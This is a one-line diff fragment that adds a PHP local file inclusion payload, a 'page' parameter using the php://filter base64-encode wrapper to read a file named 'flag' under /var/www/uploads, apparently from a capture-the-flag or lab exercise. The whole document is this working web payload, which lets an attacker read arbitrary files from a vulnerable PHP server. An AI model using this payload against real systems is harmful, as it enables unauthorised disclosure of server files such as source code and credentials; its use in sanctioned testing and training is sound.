@@ -1,0 +1,1 @@
+?page=php://filter/convert.base64-encode/resource=/var/www/uploads/flag
